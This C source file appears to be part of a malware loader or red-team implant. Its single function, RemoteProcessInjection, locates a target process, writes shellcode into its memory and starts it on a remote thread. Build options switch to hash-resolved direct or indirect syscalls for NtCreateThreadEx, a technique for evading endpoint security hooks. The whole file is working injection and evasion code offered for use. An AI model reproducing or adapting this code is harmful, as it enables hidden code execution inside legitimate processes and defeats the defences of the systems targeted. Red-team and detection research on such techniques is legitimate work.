#include "injection.h"


BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
    PVOID		pShellcodeAddress			= NULL;
	SIZE_T		sOriginalSize				= sPayloadSize;
	SIZE_T		sNumberOfBytesWritten		= 0;
    DWORD		dwProcessId				    = 0;
	DWORD		dwOldProtection				= 0;
	NTSTATUS	status						= STATUS_SUCCESS;
	HANDLE		hThread						= NULL;

    WDebugPrint(L"[i] Searching For Process Id Of \"%s\" ...\n", szProcessName);
#ifdef SYSCALL_ENABLED
	if (!syscall_GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		DebugPrint("[!] Process is Not Found \n");
		return -1;
	}
#else
	if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		DebugPrint("[!] Process is Not Found \n");
		return -1;
	}
#endif
	DebugPrint("[+] DONE\n");
	DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);
	DebugPrint("[i] Target process handle: 0x%p\n", hProcess);

	DebugPrint("[i] Writing Shellcode To The Target Process ...\n");
	if (!payload_loading(&pShellcodeAddress, pPayload, sPayloadSize, hProcess, szProcessName)) {
		return FALSE;
	}
	PrintMemoryBytes(hProcess, pShellcodeAddress, 20);
	DebugPrint("[+] DONE \n\n");

	// Running the shellcode as a new thread's entry in the remote process
	DebugPrint("[i] Executing Payload ... ");
#ifdef HW_INDIRECT_SYSCALL
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscallHash(NtCreateThreadEx_JOAA);
	
	if (!pNtCreateThreadEx) {
		DebugPrint("[-] Failed to prepare syscall for NtCreateThreadEx.\n");
		return -2; // Error code
	}
	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, FALSE, 0, 0, 0, NULL);
	if(!NT_SUCCESS(status)) {
		DebugPrint("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", status);
		return -1;
	}
#else
	if (CreateRemoteThread(hProcess, NULL, 0, pShellcodeAddress, NULL, 0, NULL) == NULL) {
		DebugPrint("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
#endif
	DebugPrint("[+] DONE !\n");

	return TRUE;
}